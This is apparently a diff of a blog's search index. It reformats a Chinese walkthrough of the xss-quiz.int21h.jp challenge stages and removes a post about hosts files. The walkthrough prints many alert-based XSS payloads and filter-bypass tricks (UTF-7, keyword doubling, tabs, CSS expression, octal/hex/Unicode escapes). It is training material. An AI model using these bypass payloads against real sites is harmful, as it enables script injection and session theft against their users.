+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">" onfocus="</span>alert(<span class="built_in">document</span>.domain);<span class="string">"</span></span><br></pre></td></tr></table></figure>
+<p>==================Don’t look boring==========================</p>
 <p>Ps:<br></p>
 <blockquote>
 <p>当使用XSS时，分为三种类型:<br><br><strong>A</strong>:直接注入，可以截断属性，注入事件。</p>
 </blockquote>
-<pre><code>Script tags: &lt;script src=&quot; ;&gt;
-Event handler attributes: &lt;body onload=&quot;alert(&apos;xss&apos;)&quot;&gt;
-CSS: &lt;p style=&quot;background:url(&apos;javascript:alert(1)&apos;)&quot;&gt;
-URLs:&lt;img src=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;
-</code></pre><blockquote>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Script tags: <span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">" ;&gt;</span></span></span></span><br><span class="line">Event handler attributes: &lt;body onload="alert('xss')"&gt;</span><br><span class="line">CSS: &lt;p style="background:url('javascript:alert(1)')"&gt;</span><br><span class="line">URLs:&lt;img src="javascript:alert('XSS')"&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
 <p><strong>B</strong>.Proprietary extensions to HTML private development<br>私人开发专有扩展HTML，<strong>主要是针对只支持IE浏览器的私有标签！</strong></p>
 </blockquote>
-<pre><code>XML data islands(IE) :
-&lt;xml src=&quot; ; id=&quot;x&quot;&gt;
-&lt;span datasrc=&quot;#x&quot; datafld=&quot;c&quot; dataformatas=&quot;html&quot;&gt;
-</code></pre><p>XML data islands(IE)(数据岛)(<a href="http://www.w3school.com.cn/xml/xml_dont.asp" target="_blank" rel="noopener">使用</a>)：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">XML data islands(IE) :</span><br><span class="line">&lt;xml src=<span class="string">" ; id="</span>x<span class="string">"&gt;</span></span><br><span class="line">&lt;span datasrc="#x" datafld="c" dataformatas="html"&gt;</span><br></pre></td></tr></table></figure>
+<p>XML data islands(IE)(数据岛)(<a href="http://www.w3school.com.cn/xml/xml_dont.asp" target="_blank" rel="noopener">使用</a>)：</p>
 <blockquote>
 <p>1.是嵌入 HTML 页面中的 XML 数据。<br><br>2.XML 数据岛只在 Internet Explorer 浏览器中有效。<br></p>
 </blockquote>
-<pre><code>JavaScript expressions in attribute(NS4):
-&lt;p id=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;
-
-
-Conditional comments(IE)
-&lt;!--[if gte IE 4]&gt;
-&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;
-&lt;![endif]--&gt;
-</code></pre><p>Conditional comments(条件注释)：定义了一些通过IE执行的HTML标记</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">JavaScript expressions <span class="keyword">in</span> attribute(NS4):</span><br><span class="line">&lt;p id=<span class="string">"&amp;&#123;alert('XSS')&#125;"</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>​<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Conditional comments(IE)</span><br><span class="line">&lt;!--[<span class="keyword">if</span> gte IE <span class="number">4</span>]&gt;</span><br><span class="line">&lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>Conditional comments(条件注释)：定义了一些通过IE执行的HTML标记</p>
 <h1 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h1><blockquote>
 <p><a href="http://xss-quiz.int21h.jp/stage07.php?sid=459abb17ecd98b0930668f93ee5beba7f81cf0e2" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage07.php?sid=459abb17ecd98b0930668f93ee5beba7f81cf0e2</a></p>
 </blockquote>
-<pre><code>&quot; onfocus=alert(document.domain);
-</code></pre><p>上面第六关还是能注入，不知道后台验证怎么处理的？</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">" onfocus=alert(document.domain);</span></span><br></pre></td></tr></table></figure>
+<p>上面第六关还是能注入，不知道后台验证怎么处理的？</p>
 <h1 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h1><blockquote>
 <p><a href="http://xss-quiz.int21h.jp/stage008.php?sid=69802cd8ff91f9b4fd0a84d9c67ff957cdd04cf5" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage008.php?sid=69802cd8ff91f9b4fd0a84d9c67ff957cdd04cf5</a></p>
 </blockquote>
@@ -1964,18 +1952,17 @@ Conditional comments(IE)
 <p><a href="http://xss-quiz.int21h.jp/stage_09.php?sid=8b17627ebee78fbe1bd2b569f8e2fd96c0934aa9" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_09.php?sid=8b17627ebee78fbe1bd2b569f8e2fd96c0934aa9</a></p>
 </blockquote>
 <p>查看源码，发现提交数据时，带有一行数据编码：</p>
-<pre><code>&lt;INPUT size=50 name=p1&gt;
-&lt;INPUT type=hidden value=euc-jp name=charset&gt;
-</code></pre><p>可以利用了IE对于UTF-7的漏洞，过滤对于UTF-7的不支持，以及IE对于UTF-7的漏洞！</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;INPUT size=<span class="number">50</span> name=p1&gt;</span><br><span class="line">&lt;INPUT type=hidden value=euc-jp name=charset&gt;</span><br></pre></td></tr></table></figure>
+<p>可以利用了IE对于UTF-7的漏洞，过滤对于UTF-7的不支持，以及IE对于UTF-7的漏洞！</p>
 <h2 id="UTF-7"><a href="#UTF-7" class="headerlink" title="UTF-7"></a>UTF-7</h2><blockquote>
 <p>用以将Unicode字符以ASCII编码的字符串来呈现。</p>
 </blockquote>
-<pre><code>&lt;INPUT name=&quot;charset&quot; type=&quot;hidden&quot; value=&quot;utf-7&quot; &gt;
-</code></pre><p>将</p>
-<pre><code>&quot; onfocus=&quot;alert(document.domain);
-</code></pre><p>utf-7编码为：</p>
-<pre><code>+ACI onfocus+AD0AIg-alert(document.domain)+ADs-
-</code></pre><p>这个编码网站挺全的：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;INPUT name=<span class="string">"charset"</span> type=<span class="string">"hidden"</span> value=<span class="string">"utf-7"</span> &gt;</span><br></pre></td></tr></table></figure>
+<p>将</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">" onfocus="</span>alert(<span class="built_in">document</span>.domain);</span><br></pre></td></tr></table></figure>
+<p>utf-7编码为：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">+ACI onfocus+AD0AIg-alert(<span class="built_in">document</span>.domain)+ADs-</span><br></pre></td></tr></table></figure>
+<p>这个编码网站挺全的：</p>
 <p><strong><a href="http://toolswebtop.com/text/process/encode" target="_blank" rel="noopener">http://toolswebtop.com/text/process/encode</a></strong>(<a href="http://toolswebtop.com/text/process/encode" target="_blank" rel="noopener">点击</a>)</p>
 <h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><blockquote>
 <p><a href="http://xss-quiz.int21h.jp/stage00010.php?sid=03afa49981651d6e65498615e3ea60525a79d6e3" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage00010.php?sid=03afa49981651d6e65498615e3ea60525a79d6e3</a></p>
@@ -1984,162 +1971,125 @@ Conditional comments(IE)
 <blockquote>
 <p>例如他过滤了“domain”关键字，那么只要domain出现，就会被替换，那么可以在domain关键字中间再加一个，组成“dodomainmain”，这样中间的domain被过滤，剩下的部分组成domain，这样就越过了！（好机智！）</p>
 </blockquote>
-<pre><code>&quot; onfocus=&quot;alert(document.dodomainmain)&quot;
-</code></pre><h1 id="第十一关："><a href="#第十一关：" class="headerlink" title="第十一关："></a>第十一关：</h1><blockquote>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">" onfocus="</span>alert(<span class="built_in">document</span>.dodomainmain)<span class="string">"</span></span><br></pre></td></tr></table></figure>
+<h1 id="第十一关："><a href="#第十一关：" class="headerlink" title="第十一关："></a>第十一关：</h1><blockquote>
 <p><a href="http://xss-quiz.int21h.jp/stage11th.php?sid=8e2ec6beef278b3786780ab3b7fe5729b6746f83" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage11th.php?sid=8e2ec6beef278b3786780ab3b7fe5729b6746f83</a></p>
 </blockquote>
 <p>输入：</p>
-<pre><code>&quot; onfocus=&quot;alert(document.dodomainmain)&quot;
-</code></pre><p>查看页面源码：</p>
-<pre><code>&lt;INPUT size=50 name=p1 ? onxxx=&quot;alert(document.dodomainmain)&quot;&gt;
-</code></pre><p>查看提示：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">" onfocus="</span>alert(<span class="built_in">document</span>.dodomainmain)<span class="string">"</span></span><br></pre></td></tr></table></figure>
+<p>查看页面源码：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;INPUT size=<span class="number">50</span> name=p1 ? onxxx=<span class="string">"alert(document.dodomainmain)"</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>查看提示：</p>
 <blockquote>
 <p>Hint: “s/script/xscript/ig;” and “s/on[a-z]+=/onxxx=/ig;” and “s/style=/stxxx=/ig;” </p>
 <p>说明过滤了<code>on.*</code>等一大部分， <code>s.*</code>和<code>script.</code>会变成<code>&lt;xscript&gt;</code> </p>
 <h2 id="制表符越过"><a href="#制表符越过" class="headerlink" title="制表符越过"></a>制表符越过</h2><p>输入：</p>
 </blockquote>
-<pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(document.domain);&quot;&gt;XSS&lt;/a&gt;
-</code></pre><p>源码发现：</p>
-<pre><code>&lt;A href=&quot;javaxscript:alert(document.domain);&quot;&gt;XSS&lt;/A&gt;
-</code></pre><p>加入制表符：</p>
-<pre><code>&quot;&gt;&lt;a href=&quot;javascri    p    t:alert(document.domain)&quot;;&gt;XSS&lt;/a&gt; //OK
-</code></pre><p>过了！</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;a href="</span>javascript:alert(<span class="built_in">document</span>.domain);<span class="string">"&gt;XSS&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>
+<p>源码发现：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;A href=<span class="string">"javaxscript:alert(document.domain);"</span>&gt;XSS&lt;<span class="regexp">/A&gt;</span></span><br></pre></td></tr></table></figure>
+<p>加入制表符：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;a href="</span>javascri	p	t:alert(<span class="built_in">document</span>.domain)<span class="string">";&gt;XSS&lt;/a&gt; //OK</span></span><br></pre></td></tr></table></figure>
+<p>过了！</p>
 <p>疑惑：<br>为什么</p>
-<pre><code>&quot; on&amp;#x09;focus=&quot;alert(document.dodomainmain)&quot;
-</code></pre><p>过不去？</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">" on&amp;#x09;focus="</span>alert(<span class="built_in">document</span>.dodomainmain)<span class="string">"</span></span><br></pre></td></tr></table></figure>
+<p>过不去？</p>
 <p>显示：</p>
-<pre><code>&lt;INPUT size=50 name=p1 ? on&amp;#x09;focus=&quot;alert(document.dodomainmain)&quot;&gt;
-</code></pre><p>但是，如果输入</p>
-<pre><code>&quot; on&amp;#x09;focus=&quot;al&amp;#x09;ert(document.dodomainmain)&quot;
-</code></pre><p>显示：</p>
-<pre><code>&lt;INPUT size=50 name=p1 ? on&amp;#x09;focus=&quot;al&amp;#9;ert(document.dodomainmain)&quot;&gt;
-</code></pre><p>这个HTML的转义应该是针对字符串的;</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;INPUT size=50 name=p1 ? on&amp;#x09;focus="alert(document.dodomainmain)"&gt;</span><br></pre></td></tr></table></figure>
+<p>但是，如果输入</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">" on&amp;#x09;focus="al&amp;#x09;ert(document.dodomainmain)"</span><br></pre></td></tr></table></figure>
+<p>显示：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;INPUT size=50 name=p1 ? on&amp;#x09;focus="al&amp;#9;ert(document.dodomainmain)"&gt;</span><br></pre></td></tr></table></figure>
+<p>这个HTML的转义应该是针对字符串的;</p>
 <p>总结：以后尽量把结果引<code>&lt;a href=&quot;&quot;&gt;&lt;/a&gt;</code>。</p>
 <h1 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h1><blockquote>
 <p><a href="http://xss-quiz.int21h.jp/stage_no012.php?sid=5fce85f3ef5a811fe114d396d935edaf0ebde988" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_no012.php?sid=5fce85f3ef5a811fe114d396d935edaf0ebde988</a></p>
 </blockquote>
 <p>发现，<code>&lt;&gt;``&quot;&quot;</code>单独使用并未过滤，但是<code>&lt;script&gt;</code>、<code>alert</code>是被过滤了</p>
 <p>再看Hint：</p>
-<pre><code>&quot;s/[\x00-\x20\&lt;\&gt;\&quot;\&apos;]//g;&quot; 
-</code></pre><p><code>x00~x20</code>都被过滤，制表符无法使用了！，同样，<code>&lt;&gt; &quot;  &#39;</code>都被滤了！</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">"s/[\x00-\x20\&lt;\&gt;\"\']//g;"</span></span><br></pre></td></tr></table></figure>
+<p><code>x00~x20</code>都被过滤，制表符无法使用了！，同样，<code>&lt;&gt; &quot;  &#39;</code>都被滤了！</p>
 <h2 id="利用IE-的漏洞"><a href="#利用IE-的漏洞" class="headerlink" title="利用IE ``的漏洞"></a>利用IE ``的漏洞</h2><p>IE对于反单引号没有很好的过滤，使用  ``  可以很轻松的截断输入，但是在google下测试，发现 `` 被过滤了。<br>&gt;</p>
 <blockquote>
 <p><font color="red"><strong>`</strong></font>:反单引号，上排数字键1的前面，其上档符号是“~ ”</p>
 </blockquote>
 <p>可以截断输入，那就好办了！</p>
-<pre><code>`` onfocus=&quot;alert(document.domain);&quot;  //IE下可行
-</code></pre><h1 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h1><blockquote>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">``</span> onfocus=<span class="string">"alert(document.domain);"</span>  <span class="comment">//IE下可行</span></span><br></pre></td></tr></table></figure>
+<h1 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h1><blockquote>
 <p><a href="http://xss-quiz.int21h.jp/stage13_0.php?sid=609f8f638582fa34f0405165397b3498ff14ccc6" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage13_0.php?sid=609f8f638582fa34f0405165397b3498ff14ccc6</a></p>
 </blockquote>
 <p>如何在CSS样式中利用expression实现JavaScript中的onmouseover/onmouseout事件。<br><br>很奇怪，在ie11上，答案也不能成功，但是换了虚拟机里的IE8，成功。<br><br><strong>说明这个expression是一个浏览器兼容性的问题</strong>，解决这类兼容性xss漏洞，使用ie6即以下，效果可能更好！<br><br>附答案：</p>
-<pre><code>aa:expression(onfocus = function(){alert(document.domain)})
-</code></pre><blockquote>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">aa:expression(onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="built_in">document</span>.domain)&#125;)</span><br></pre></td></tr></table></figure>
+<blockquote>
 <p>在CSS样式中注入这段代码就能弹了。。<br><br>但是现实环境中怎么可能有如此简单就能插入的地方。。<br><br>很难找到的说。。<br><br>话说，现实中怎么利用呢？<br><br>有2种注入：<br></p>
 </blockquote>
 <p>(1)@import 和 expression<br></p>
-<pre><code>@import &quot;http://web/xss.css&quot;  
-@import &apos;javascript:alert(&quot;xss&quot;)&apos;  
-body{xss:expression(alert(&apos;xss&apos;))]  
-&lt;img style=&quot;xss:expression(alert(&apos;xss&apos;))&quot;&gt;  
-</code></pre><p>(2)css代码中js，vs脚本</p>
-<pre><code>body{backgroud-image:url(javascript:alert(&apos;xss&apos;))}  
-body{backgroud-image:url(vbscript:msgbox(&apos;xss&apos;))} 
-</code></pre><h1 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h1><blockquote>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">@<span class="keyword">import</span> <span class="string">"http://web/xss.css"</span>  </span><br><span class="line">@<span class="keyword">import</span> <span class="string">'javascript:alert("xss")'</span>  </span><br><span class="line">body&#123;<span class="attr">xss</span>:expression(alert(<span class="string">'xss'</span>))]  </span><br><span class="line">&lt;img style=<span class="string">"xss:expression(alert('xss'))"</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>(2)css代码中js，vs脚本</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">body&#123;backgroud-image:url(javascript:alert(<span class="string">'xss'</span>))&#125;  </span><br><span class="line">body&#123;backgroud-image:url(vbscript:msgbox(<span class="string">'xss'</span>))&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h1><blockquote>
 <p><a href="http://xss-quiz.int21h.jp/stage-_-14.php?sid=a31bf0d89239baebc366349049721215014871f8" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage-_-14.php?sid=a31bf0d89239baebc366349049721215014871f8</a></p>
 <p>发现expression关键字被正则了！绕过<strong>(IE8即以下！)</strong>：<br></p>
 </blockquote>
 <p>1.编码绕过</p>
-<pre><code>aa:\0065xpression(onfocus = function(){alert(document.domain)}) ERROR
-</code></pre><p>2.<code>\</code> 绕过</p>
-<pre><code>aa:e\xpression(onfocus = function(){alert(document.domain)}) ERROR
-</code></pre><p>3.<code>\0</code> 绕过</p>
-<pre><code>aa:e\0xpression(onfocus = function(){alert(document.domain)}) ok
-</code></pre><p>4.<code>\**\</code>绕过</p>
-<pre><code>aa:e\**\xpression(onfocus = function(){alert(document.domain)}) ERROR
-</code></pre><p>5.<code>/**/</code>绕过</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">aa:\<span class="number">0065</span>xpression(onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="built_in">document</span>.domain)&#125;) ERROR</span><br></pre></td></tr></table></figure>
+<p>2.<code>\</code> 绕过</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">aa:e\xpression(onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="built_in">document</span>.domain)&#125;) ERROR</span><br></pre></td></tr></table></figure>
+<p>3.<code>\0</code> 绕过</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">aa:e\<span class="number">0</span>xpression(onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="built_in">document</span>.domain)&#125;) ok</span><br></pre></td></tr></table></figure>
+<p>4.<code>\**\</code>绕过</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">aa:e\**\xpression(onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="built_in">document</span>.domain)&#125;) ERROR</span><br></pre></td></tr></table></figure>
+<p>5.<code>/**/</code>绕过</p>
 <blockquote>
 <p>好像是注解绕过</p>
 </blockquote>
-<pre><code>aa:e/**/xpression(onfocus = function(){alert(document.domain)}) ok
-</code></pre><p><strong><font color="orange"><code>\uxxxx</code>这种格式是Unicode写法，表示一个字符，其中xxxx表示一个16进制数字，范围所0～65535. Unicode十六进制数只能包含数字0～9、大写字母A～F或者小写字母A～F。需要注意到是：Unicode的大小端问题，一般都是小端在前，例如 <code>\u5c0f</code> 表示汉语中的 ‘小’字，转换成10进制就是9215，所以在byte数组中应该是1592.</font></strong></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">aa:e<span class="comment">/**/</span>xpression(onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;alert(<span class="built_in">document</span>.domain)&#125;) ok</span><br></pre></td></tr></table></figure>
+<p><strong><font color="orange"><code>\uxxxx</code>这种格式是Unicode写法，表示一个字符，其中xxxx表示一个16进制数字，范围所0～65535. Unicode十六进制数只能包含数字0～9、大写字母A～F或者小写字母A～F。需要注意到是：Unicode的大小端问题，一般都是小端在前，例如 <code>\u5c0f</code> 表示汉语中的 ‘小’字，转换成10进制就是9215，所以在byte数组中应该是1592.</font></strong></p>
 <h1 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h1><blockquote>
 <p><a href="http://xss-quiz.int21h.jp/stage__15.php?sid=06dc6feab3cd2eb57a3f8a0de6be1bc57a2ccda1" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage__15.php?sid=06dc6feab3cd2eb57a3f8a0de6be1bc57a2ccda1</a></p>
 </blockquote>
 <p>输入：</p>
-<pre><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;
-</code></pre><p>源码查看，不是审查元素</p>
-<pre><code>&lt;script&gt;document.write(&quot;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&quot;);&lt;/script&gt;
-</code></pre><p>可以看到 <code>&lt; &gt;</code>这两个字符被替换为<code>&quot;&amp;lt;</code>和<code>&amp;gt</code>;，说明有过滤！</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.domain)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>源码查看，不是审查元素</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">"&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;"</span>);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>可以看到 <code>&lt; &gt;</code>这两个字符被替换为<code>&quot;&amp;lt;</code>和<code>&amp;gt</code>;，说明有过滤！</p>
 <p>由于此页使用<code>document.write(value)</code>，来写出内容，所以肯定存在注入！</p>
 <p>控制台</p>
-<pre><code>alert(&quot;\u003c&quot;) //显示符号 &lt;
-\u0061lert(&quot;123&quot;) //123
-</code></pre><p>JS支持这种写法，此处注入：</p>
-<pre><code>\\74script\\76alert(document.domain);\\74/script\\76
-</code></pre><p>能成功的原因在于使用：</p>
-<pre><code>document.write();
-</code></pre><p>执行了js，将字符串编译了！</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">alert(<span class="string">"\u003c"</span>) <span class="comment">//显示符号 &lt;</span></span><br><span class="line">\u0061lert(<span class="string">"123"</span>) <span class="comment">//123</span></span><br></pre></td></tr></table></figure>
+<p>JS支持这种写法，此处注入：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\\<span class="number">74</span>script\\<span class="number">76</span>alert(<span class="built_in">document</span>.domain);\\<span class="number">74</span>/script\\<span class="number">76</span></span><br></pre></td></tr></table></figure>
+<p>能成功的原因在于使用：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.write();</span><br></pre></td></tr></table></figure>
+<p>执行了js，将字符串编译了！</p>
 <h2 id="JS编码（-转义字符-八进制-十六进制-unicode）-lt-参见-gt"><a href="#JS编码（-转义字符-八进制-十六进制-unicode）-lt-参见-gt" class="headerlink" title="JS编码（\转义字符+八进制 || 十六进制 || unicode）&lt;参见&gt;"></a>JS编码（\转义字符+八进制 || 十六进制 || unicode）&lt;<a href="http://www.cnblogs.com/ecalf/archive/2012/09/04/unicode.html" target="_blank" rel="noopener">参见</a>&gt;</h2><blockquote>
 <p><strong>所有的ASCII码都可以用<code>\</code>加数字（一般是8进制数字）来表示。<code>\x</code>表示后面的字符是十六进制数，<code>\</code>表示后面的字符是八进制数。</strong><br> </p>
 </blockquote>
 <p>八进制（<code>\</code>+八进制）</p>
-<pre><code>\74script\76alert(document.domain);\74/script\76
-</code></pre><p>十六进制</p>
-<pre><code>\x3cscript\x3ealert(document.domain);\x3c/script\x3e
-</code></pre><p>发现过滤了单个 <code>\</code></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\<span class="number">74</span>script\<span class="number">76</span>alert(<span class="built_in">document</span>.domain);\<span class="number">74</span>/script\<span class="number">76</span></span><br></pre></td></tr></table></figure>
+<p>十六进制</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\x3cscript\x3ealert(<span class="built_in">document</span>.domain);\x3c/script\x3e</span><br></pre></td></tr></table></figure>
+<p>发现过滤了单个 <code>\</code></p>
 <p>Octonary：</p>
-<pre><code>\\74script\\76alert(document.domain);\\74/script\\76
-</code></pre><p>Hexadecimal</p>
-<pre><code>\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e
-</code></pre><p><strong>Unicode</strong>好像也可以！</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\\<span class="number">74</span>script\\<span class="number">76</span>alert(<span class="built_in">document</span>.domain);\\<span class="number">74</span>/script\\<span class="number">76</span></span><br></pre></td></tr></table></figure>
+<p>Hexadecimal</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\\x3cscript\\x3ealert(<span class="built_in">document</span>.domain);\\x3c/script\\x3e</span><br></pre></td></tr></table></figure>
+<p><strong>Unicode</strong>好像也可以！</p>
 <blockquote>
 <p><code>\u</code> 加 4个16进制字符表示一个字符的编码</p>
 </blockquote>
-<pre><code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
-</code></pre><h1 id="十六关"><a href="#十六关" class="headerlink" title="十六关"></a>十六关</h1><blockquote>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\\u003cscript\\u003ealert(<span class="built_in">document</span>.domain);\\u003c/script\\u003e</span><br></pre></td></tr></table></figure>
+<h1 id="十六关"><a href="#十六关" class="headerlink" title="十六关"></a>十六关</h1><blockquote>
 <p><a href="http://xss-quiz.int21h.jp/stage00000016.php?sid=0f20ae30108832c1a7f8aa65d59214523f03a73d" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage00000016.php?sid=0f20ae30108832c1a7f8aa65d59214523f03a73d</a></p>
 </blockquote>
 <p>过滤了十六进制，我们还有八进制和unicode</p>
-<pre><code>\\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
-
-\\74script\\76alert(document.domain);\\74/script\\76
-</code></pre><h2 id="第十七十八（UNSOLVED）"><a href="#第十七十八（UNSOLVED）" class="headerlink" title="第十七十八（UNSOLVED）"></a>第十七十八（UNSOLVED）</h2><blockquote>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\\u003cscript\\u003ealert(<span class="built_in">document</span>.domain);\\u003c/script\\u003e</span><br><span class="line"></span><br><span class="line">\\<span class="number">74</span>script\\<span class="number">76</span>alert(<span class="built_in">document</span>.domain);\\<span class="number">74</span>/script\\<span class="number">76</span></span><br></pre></td></tr></table></figure>
+<h2 id="第十七十八（UNSOLVED）"><a href="#第十七十八（UNSOLVED）" class="headerlink" title="第十七十八（UNSOLVED）"></a>第十七十八（UNSOLVED）</h2><blockquote>
 <p>需要配合IE6即以下浏览器解决！</p>
 </blockquote>
 ]]></content>
       <tags>
         <tag>JavaScript</tag>
         <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hosts使用</title>
-    <url>/2016/08/01/hosts/</url>
-    <content><![CDATA[<p></p><h2>关于hosts二三事</h2><br>没有任何的意思，方便程序员查资料！<p></p>
-<p></p><h3>原理</h3><p></p>
-<blockquote>
-<p>总的来说，Google配合baidu可以发挥出中文搜索的功力了。百度的优点，常见问题搜索比较全面，一般能找到心仪答案，但是对于较为生僻的问题，一般主要是不准。<br><br>使用google一般比较准确，前面的搜索项能代表基本问题。一般配合baidu中文搜索的能力补全。平时不可能一直开着vpn或者shadowsocks。<br></p>
-</blockquote>
-<p><strong>p.s.</strong>发现了个好玩的：国外IP访问国内网页，竟然有地域限制，蛤蛤！<br></p>
-<blockquote>
-<p>DNS污染（域名污染），将网址解析为不正确的IP地址，使得访问不到正确的IP。但是计算机，实际上是先在本地hosts文件中查看，如果解析出正确的IP，则可以直接访问，不需要访问DNS服务器了。<br></p>
-</blockquote>
-<p><strong>p.s.</strong>hosts需要不定期更新（当你上不去的时候）。</p>
-<p></p><h3>关于修改hosts</h3><br><strong>windows:</strong>C:\Windows\System32\drivers\etc <br><p></p>
-<blockquote>
-<p>目录下的hosts文件，权限问的话，先拷出来，改完后，覆盖回去。最后<strong>cmd</strong>下<strong>ipconfig /flushdns</strong><br></p>
-</blockquote>
-<p><strong>ubuntu:</strong>/etc<br></p>
-<blockquote>
-<p>目录下hosts修改。<br></p>
-</blockquote>
-<a id="more"></a>
-<p><strong>Google使用技巧</strong></p>
-<p><img src="http://i.imgur.com/FpgqLx0.jpg" alt></p>
-<p></p><h3>经常去的源</h3><br><a href="https://laod.org/hosts/2016-google-hosts.html" target="_blank" rel="noopener">laod</a><br><br><a href="https://serve.netsh.org/pub/ipv4-hosts/" target="_blank" rel="noopener">奶齿</a><p></p>
-]]></content>
-      <tags>
-        <tag>hosts</tag>
       </tags>
   </entry>
 </search>
